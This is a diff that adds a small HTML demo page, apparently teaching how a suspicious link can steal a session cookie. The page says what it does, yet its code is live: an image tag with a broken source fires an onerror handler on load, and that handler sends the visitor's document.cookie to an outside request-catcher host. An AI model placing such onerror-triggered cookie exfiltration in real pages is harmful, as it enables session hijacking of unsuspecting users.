@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>xxs_demo</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css"
+    />
+  </head>
+  <script>
+    function close_tab() {
+      window.close();
+    }
+
+    function haq() {
+      fetch("https://haq.requestcatcher.com/?=" + document.cookie);
+    }
+  </script>
+  <body>
+    <script></script>
+    <div class="columns is-mobile is-centered">
+      <div class="column is-two-thirds">
+        <h1 class="title is-2">Imagine clicking on a random suspicious link</h1>
+        <div class="box">
+          <h1 class="title is-4">What just happened?</h1>
+          <h1 class="subtitle is-6">
+            Malicious links often redirect you to another website, sometimes
+            it's an ad that you don't notice and other's it seems like just
+            another redirection to another internal page. However you may have
+            just had your personal or session details leaked! This site tries to
+            get your cookie session token, see if you can find it by opening the
+            inspect element!
+          </h1>
+          <img src="x" onerror="haq()" />
+          <button
+            class="button is-fullwidth is-medium is-warning"
+            id="close-me"
+            onclick="close_tab()"
+          >
+            Close this tab
+          </button>
+          <h1 class="subtitle is-7">This button is safe.. haha.. unless??</h1>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
